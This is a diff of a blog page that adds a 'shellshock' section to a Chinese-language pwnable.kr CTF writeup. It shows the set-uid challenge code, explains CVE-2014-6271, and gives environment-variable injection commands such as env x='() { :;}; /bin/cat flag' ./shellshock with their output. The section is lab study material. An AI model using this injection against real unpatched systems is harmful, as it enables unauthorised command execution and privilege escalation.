@@ -28,7 +28,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/juicymio.github.io\/pwnable.kr\/"
-        },"genre": "posts","keywords": "pwn","wordcount":  2745 ,
+        },"genre": "posts","keywords": "pwn","wordcount":  3041 ,
         "url": "http:\/\/juicymio.github.io\/pwnable.kr\/","datePublished": "2022-10-12T17:19:11+08:00","dateModified": "2022-10-12T17:19:11+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -102,8 +102,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwnable.kr</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>JuicyMio</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2745 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3041 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -122,6 +122,7 @@
     <li><a href="#7-input">7 input</a></li>
     <li><a href="#8-leg">8 leg</a></li>
     <li><a href="#9-mistake">9 mistake</a></li>
+    <li><a href="#10-shellshock">10 shellshock</a></li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h1 id="pwnablekr-writeup">pwnable.kr writeup</h1>
@@ -988,6 +989,99 @@
 </span></span><span class="line"><span class="cl">Mommy, the operator priority always confuses me :(
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="10-shellshock">10 shellshock</h2>
+<p>这是一个set-uid程序:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是一个别名为shellshock的漏洞, CVE-2014-6271
+原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">export foo=&#39;{:;}; echo test&#39;
+</span></span><span class="line"><span class="cl">bash
+</span></span><span class="line"><span class="cl">test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试方法:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; bash -c &#34;echo this is a test&#34;
+</span></span><span class="line"><span class="cl">this is a test
+</span></span><span class="line"><span class="cl">shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; ./bash -c &#34;echo this is a test&#34;
+</span></span><span class="line"><span class="cl">vulnerable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞
+攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>确保了这一点.
+所以可以这样攻击:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock
+</span></span><span class="line"><span class="cl">only if I knew CVE-2014-6271 ten years ago..!!
+</span></span><span class="line"><span class="cl">Segmentation fault
+</span></span><span class="line"><span class="cl">shellshock@ubuntu:~$
+</span></span></code></pre></td></tr></table>
+</div>
 </div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
@@ -1012,7 +1106,7 @@
     </div>
 
     <div class="post-nav">
-            <a href="/c/" class="next" rel="next" title="C八股">C八股<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+            <a href="/c/" class="next" rel="next" title="C八股及常见问题">C八股及常见问题<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"></div></article></div>
             </main><footer class="footer">
